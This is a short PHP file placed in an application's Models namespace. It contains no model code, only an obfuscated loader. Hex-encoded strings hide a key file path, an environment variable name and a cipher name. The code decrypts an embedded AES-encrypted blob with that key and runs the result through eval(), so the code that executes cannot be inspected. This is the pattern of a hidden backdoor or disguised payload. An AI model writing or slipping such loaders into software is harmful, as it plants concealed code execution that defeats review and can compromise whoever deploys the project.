<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LZuzrphUA47tow141BrjbA==');

$c=base64_decode(

'mVGkmZ8byk4viXkAhSP9S8yZ0ZZlBlfMTRdklQRkkRloRgbamAAd8h/AQFaPu3+3ySfhUMnbJy1e' .
'yiWRakgojS3YoX6+Wbg77CVYSP8ia5FPcKsg9R7f/m7SwhlrRSp23/fwq6YMc4FG0g1aNHQVrRdr' .
'Y4VzIiZLxJTE/2jqYzWCSLbgwULl/tekOeglY9glBHSr09n+3I5jGorqreJfHk8z6MGQcJEPuZ/8' .
'EhJmjsA/riCoKrx3bXtnKUicG4iJKHn6uwDevh7u86BbX3YpKXqK0UaQRJVCxSnnX65HEx3lKviY' .
'xqjqyJcu7eTVK3hHSnbXxY60traPYnUb5Cl6GDb80ZBJWMiIIkyeQ71j4DOB5SQ9zmX+h8sUn2m4' .
'+8/dHJmuLq9igyJg33HCyM/agGkBW42LGrKIrZWBrHh/2ouRDhddKyVGLhcPgaEQzwgNdjST0imu' .
'3XbvNuDBf0VCiBRu9YqR53HyYlvT5PbvKigH4rxTG0cnDFxAMUIXQ8Fw4/0gD68BKZUZiNPXQu2t' .
'8MxGDcTjutcjnDbhINVcJErnfdAeM2eM1SNw08moR3yTqnU723v7Qg0emDW7XWNrA2S49Q26nCgi' .
'/srThsxYDNgKaFdV/xRRi+LUIOEsBAHcBY/hCKoNjCIu9WKZVnCX9+4q6FbCaTxJeY7JUQq6ax2G' .
'X50Mcj0rH2uPT9ONab8QqI1C3+3DMUoA9OY8uZ5lfOjnsgdG4qO0P3VjQjJLmTr3ziLEXwkJcpET' .
'btmspXwmnBTbyfaXRetSeXIAIn+WOalFCpEYvtrzUociHkZGkISFnE3Opzwf8ZynREiIOQY3mZxn' .
'ObZQC7H7V0N/TVXJww6ODvw1q7xem+L0KHgCeEhaDP+0tFiX3XXAYdpFn3G9SU6QFGX8p/9K6elL' .
'E5x2pA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

